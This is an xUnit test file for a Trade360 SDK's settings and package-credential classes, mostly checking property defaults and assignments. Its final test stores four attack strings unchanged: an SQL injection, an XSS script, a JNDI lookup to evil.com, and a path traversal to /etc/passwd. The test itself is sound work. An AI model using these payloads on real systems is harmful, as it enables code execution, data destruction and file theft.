using FluentAssertions;
using Trade360SDK.Common.Configuration;
using Xunit;

namespace Trade360SDK.Common.Entities.Tests.Configuration;

public class SnapshotApiSettingsComprehensiveTests
{
    [Fact]
    public void Trade360Settings_Constructor_ShouldCreateInstanceSuccessfully()
    {
        // Act
        var settings = new Trade360Settings();

        // Assert
        settings.Should().NotBeNull();
        settings.CustomersApiBaseUrl.Should().BeNull();
        settings.SnapshotApiBaseUrl.Should().BeNull();
        settings.InplayPackageCredentials.Should().BeNull();
        settings.PrematchPackageCredentials.Should().BeNull();
    }

    [Theory]
    [InlineData("https://api.trade360.com/customers")]
    [InlineData("http://localhost:8080")]
    [InlineData("")]
    [InlineData(null)]
    [InlineData("https://test-api.trade360.com")]
    public void Trade360Settings_CustomersApiBaseUrl_ShouldAcceptNullableStringValues(string? expectedUrl)
    {
        // Arrange
        var settings = new Trade360Settings();

        // Act
        settings.CustomersApiBaseUrl = expectedUrl;

        // Assert
        settings.CustomersApiBaseUrl.Should().Be(expectedUrl);
    }

    [Theory]
    [InlineData("https://api.trade360.com/snapshot")]
    [InlineData("http://localhost:9090")]
    [InlineData("")]
    [InlineData(null)]
    [InlineData("https://snapshot-api.trade360.com")]
    public void Trade360Settings_SnapshotApiBaseUrl_ShouldAcceptNullableStringValues(string? expectedUrl)
    {
        // Arrange
        var settings = new Trade360Settings();

        // Act
        settings.SnapshotApiBaseUrl = expectedUrl;

        // Assert
        settings.SnapshotApiBaseUrl.Should().Be(expectedUrl);
    }

    [Fact]
    public void Trade360Settings_InplayPackageCredentials_ShouldAcceptNullAndValidCredentials()
    {
        // Arrange
        var settings = new Trade360Settings();
        var credentials = new PackageCredentials
        {
            PackageId = 123,
            Username = "testuser",
            Password = "testpass"
        };

        // Act
        settings.InplayPackageCredentials = credentials;

        // Assert
        settings.InplayPackageCredentials.Should().NotBeNull();
        settings.InplayPackageCredentials.Should().Be(credentials);
        settings.InplayPackageCredentials!.PackageId.Should().Be(123);
        settings.InplayPackageCredentials.Username.Should().Be("testuser");
        settings.InplayPackageCredentials.Password.Should().Be("testpass");
    }

    [Fact]
    public void Trade360Settings_PrematchPackageCredentials_ShouldAcceptNullAndValidCredentials()
    {
        // Arrange
        var settings = new Trade360Settings();
        var credentials = new PackageCredentials
        {
            PackageId = 456,
            Username = "prematchuser",
            Password = "prematchpass",
            MessageFormat = "xml"
        };

        // Act
        settings.PrematchPackageCredentials = credentials;

        // Assert
        settings.PrematchPackageCredentials.Should().NotBeNull();
        settings.PrematchPackageCredentials.Should().Be(credentials);
        settings.PrematchPackageCredentials!.PackageId.Should().Be(456);
        settings.PrematchPackageCredentials.Username.Should().Be("prematchuser");
        settings.PrematchPackageCredentials.Password.Should().Be("prematchpass");
        settings.PrematchPackageCredentials.MessageFormat.Should().Be("xml");
    }

    [Fact]
    public void Trade360Settings_AllProperties_ShouldWorkIndependently()
    {
        // Arrange
        var settings = new Trade360Settings();
        var inplayCredentials = new PackageCredentials { PackageId = 100, Username = "inplay" };
        var prematchCredentials = new PackageCredentials { PackageId = 200, Username = "prematch" };

        // Act
        settings.CustomersApiBaseUrl = "https://customers.api.com";
        settings.SnapshotApiBaseUrl = "https://snapshot.api.com";
        settings.InplayPackageCredentials = inplayCredentials;
        settings.PrematchPackageCredentials = prematchCredentials;

        // Assert
        settings.CustomersApiBaseUrl.Should().Be("https://customers.api.com");
        settings.SnapshotApiBaseUrl.Should().Be("https://snapshot.api.com");
        settings.InplayPackageCredentials.Should().Be(inplayCredentials);
        settings.PrematchPackageCredentials.Should().Be(prematchCredentials);
    }

    [Fact]
    public void PackageCredentials_Constructor_ShouldCreateInstanceSuccessfully()
    {
        // Act
        var credentials = new PackageCredentials();

        // Assert
        credentials.Should().NotBeNull();
        credentials.PackageId.Should().Be(0); // Default int value
        credentials.Username.Should().BeNull();
        credentials.Password.Should().BeNull();
        credentials.MessageFormat.Should().Be("json"); // Default value as per code
    }

    [Theory]
    [InlineData(0)]
    [InlineData(1)]
    [InlineData(100)]
    [InlineData(int.MaxValue)]
    [InlineData(int.MinValue)]
    [InlineData(-1)]
    public void PackageCredentials_PackageId_ShouldAcceptIntValues(int expectedPackageId)
    {
        // Arrange
        var credentials = new PackageCredentials();

        // Act
        credentials.PackageId = expectedPackageId;

        // Assert
        credentials.PackageId.Should().Be(expectedPackageId);
    }

    [Theory]
    [InlineData("testuser")]
    [InlineData("admin")]
    [InlineData("")]
    [InlineData(null)]
    [InlineData("user@domain.com")]
    [InlineData("very_long_username_with_special_chars_123")]
    public void PackageCredentials_Username_ShouldAcceptNullableStringValues(string? expectedUsername)
    {
        // Arrange
        var credentials = new PackageCredentials();

        // Act
        credentials.Username = expectedUsername;

        // Assert
        credentials.Username.Should().Be(expectedUsername);
    }

    [Theory]
    [InlineData("password123")]
    [InlineData("P@ssw0rd!")]
    [InlineData("")]
    [InlineData(null)]
    [InlineData("very_long_password_with_special_characters_123456789")]
    public void PackageCredentials_Password_ShouldAcceptNullableStringValues(string? expectedPassword)
    {
        // Arrange
        var credentials = new PackageCredentials();

        // Act
        credentials.Password = expectedPassword;

        // Assert
        credentials.Password.Should().Be(expectedPassword);
    }

    [Theory]
    [InlineData("json")]
    [InlineData("xml")]
    [InlineData("yaml")]
    [InlineData("")]
    [InlineData("custom")]
    public void PackageCredentials_MessageFormat_ShouldAcceptStringValues(string expectedFormat)
    {
        // Arrange
        var credentials = new PackageCredentials();

        // Act
        credentials.MessageFormat = expectedFormat;

        // Assert
        credentials.MessageFormat.Should().Be(expectedFormat);
    }

    [Fact]
    public void PackageCredentials_MessageFormat_ShouldHaveDefaultValue()
    {
        // Act
        var credentials = new PackageCredentials();

        // Assert
        credentials.MessageFormat.Should().Be("json");
    }

    [Fact]
    public void PackageCredentials_AllProperties_ShouldWorkIndependently()
    {
        // Arrange
        var credentials = new PackageCredentials();

        // Act
        credentials.PackageId = 12345;
        credentials.Username = "testuser123";
        credentials.Password = "securepass456";
        credentials.MessageFormat = "xml";

        // Assert
        credentials.PackageId.Should().Be(12345);
        credentials.Username.Should().Be("testuser123");
        credentials.Password.Should().Be("securepass456");
        credentials.MessageFormat.Should().Be("xml");
    }

    [Fact]
    public void PackageCredentials_CanBeAssignedToTrade360Settings()
    {
        // Arrange
        var settings = new Trade360Settings();
        var inplayCredentials = new PackageCredentials
        {
            PackageId = 123,
            Username = "inplay_user",
            Password = "inplay_pass",
            MessageFormat = "json"
        };
        var prematchCredentials = new PackageCredentials
        {
            PackageId = 456,
            Username = "prematch_user",
            Password = "prematch_pass",
            MessageFormat = "xml"
        };

        // Act
        settings.InplayPackageCredentials = inplayCredentials;
        settings.PrematchPackageCredentials = prematchCredentials;

        // Assert
        settings.InplayPackageCredentials.Should().Be(inplayCredentials);
        settings.PrematchPackageCredentials.Should().Be(prematchCredentials);
        settings.InplayPackageCredentials!.MessageFormat.Should().Be("json");
        settings.PrematchPackageCredentials!.MessageFormat.Should().Be("xml");
    }

    [Fact]
    public void PackageCredentials_NullAssignment_ShouldWork()
    {
        // Arrange
        var credentials = new PackageCredentials();

        // Act
        credentials.Username = null;
        credentials.Password = null;

        // Assert
        credentials.Username.Should().BeNull();
        credentials.Password.Should().BeNull();
        credentials.MessageFormat.Should().Be("json"); // Should still have default
    }

    [Fact]
    public void Trade360Settings_NullAssignment_ShouldWork()
    {
        // Arrange
        var settings = new Trade360Settings();

        // Act
        settings.CustomersApiBaseUrl = null;
        settings.SnapshotApiBaseUrl = null;
        settings.InplayPackageCredentials = null;
        settings.PrematchPackageCredentials = null;

        // Assert
        settings.CustomersApiBaseUrl.Should().BeNull();
        settings.SnapshotApiBaseUrl.Should().BeNull();
        settings.InplayPackageCredentials.Should().BeNull();
        settings.PrematchPackageCredentials.Should().BeNull();
    }

    [Fact]
    public void Both_Classes_ShouldBeInstantiable()
    {
        // Act & Assert
        var settings = new Trade360Settings();
        var credentials = new PackageCredentials();

        settings.Should().BeOfType<Trade360Settings>();
        credentials.Should().BeOfType<PackageCredentials>();
        settings.Should().NotBeNull();
        credentials.Should().NotBeNull();
    }

    [Fact]
    public void PackageCredentials_Properties_ShouldBeGettableAndSettable()
    {
        // Arrange
        var credentials = new PackageCredentials();

        // Act & Assert - Test that all properties can be read and written
        var packageId = credentials.PackageId;
        credentials.PackageId = 999;
        credentials.PackageId.Should().Be(999);

        var username = credentials.Username;
        credentials.Username = "newuser";
        credentials.Username.Should().Be("newuser");

        var password = credentials.Password;
        credentials.Password = "newpass";
        credentials.Password.Should().Be("newpass");

        var messageFormat = credentials.MessageFormat;
        credentials.MessageFormat = "yaml";
        credentials.MessageFormat.Should().Be("yaml");
    }

    [Fact]
    public void Trade360Settings_CompleteConfiguration_ShouldWorkCorrectly()
    {
        // Arrange & Act
        var settings = new Trade360Settings
        {
            CustomersApiBaseUrl = "https://customers.trade360.com",
            SnapshotApiBaseUrl = "https://snapshot.trade360.com",
            InplayPackageCredentials = new PackageCredentials
            {
                PackageId = 12345,
                Username = "inplay_user",
                Password = "inplay_secure_password",
                MessageFormat = "json"
            },
            PrematchPackageCredentials = new PackageCredentials
            {
                PackageId = 67890,
                Username = "prematch_user",
                Password = "prematch_secure_password",
                MessageFormat = "xml"
            }
        };

        // Assert
        settings.CustomersApiBaseUrl.Should().Be("https://customers.trade360.com");
        settings.SnapshotApiBaseUrl.Should().Be("https://snapshot.trade360.com");
        
        settings.InplayPackageCredentials.Should().NotBeNull();
        settings.InplayPackageCredentials!.PackageId.Should().Be(12345);
        settings.InplayPackageCredentials.Username.Should().Be("inplay_user");
        settings.InplayPackageCredentials.Password.Should().Be("inplay_secure_password");
        settings.InplayPackageCredentials.MessageFormat.Should().Be("json");
        
        settings.PrematchPackageCredentials.Should().NotBeNull();
        settings.PrematchPackageCredentials!.PackageId.Should().Be(67890);
        settings.PrematchPackageCredentials.Username.Should().Be("prematch_user");
        settings.PrematchPackageCredentials.Password.Should().Be("prematch_secure_password");
        settings.PrematchPackageCredentials.MessageFormat.Should().Be("xml");
    }

    [Fact]
    public void PackageCredentials_EdgeCaseValues_ShouldBeHandled()
    {
        // Arrange
        var credentials = new PackageCredentials();
        var longString = new string('a', 10000); // 10k characters

        // Act
        credentials.Username = longString;
        credentials.Password = longString;
        credentials.MessageFormat = longString;

        // Assert
        credentials.Username.Should().Be(longString);
        credentials.Password.Should().Be(longString);
        credentials.MessageFormat.Should().Be(longString);
    }

    [Fact]
    public void Trade360Settings_LongUrls_ShouldBeHandled()
    {
        // Arrange
        var settings = new Trade360Settings();
        var longUrl = "https://example.com/" + new string('a', 5000);

        // Act
        settings.CustomersApiBaseUrl = longUrl;
        settings.SnapshotApiBaseUrl = longUrl;

        // Assert
        settings.CustomersApiBaseUrl.Should().Be(longUrl);
        settings.SnapshotApiBaseUrl.Should().Be(longUrl);
    }

    [Theory]
    [InlineData("admin'; DROP TABLE users; --")]
    [InlineData("<script>alert('xss')</script>")]
    [InlineData("${jndi:ldap://evil.com/exploit}")]
    [InlineData("../../etc/passwd")]
    public void PackageCredentials_MaliciousInput_ShouldBeStoredAsIs(string maliciousInput)
    {
        // Arrange
        var credentials = new PackageCredentials();

        // Act - Should not sanitize or validate, just store
        credentials.Username = maliciousInput;
        credentials.Password = maliciousInput;

        // Assert
        credentials.Username.Should().Be(maliciousInput);
        credentials.Password.Should().Be(maliciousInput);
    }
} 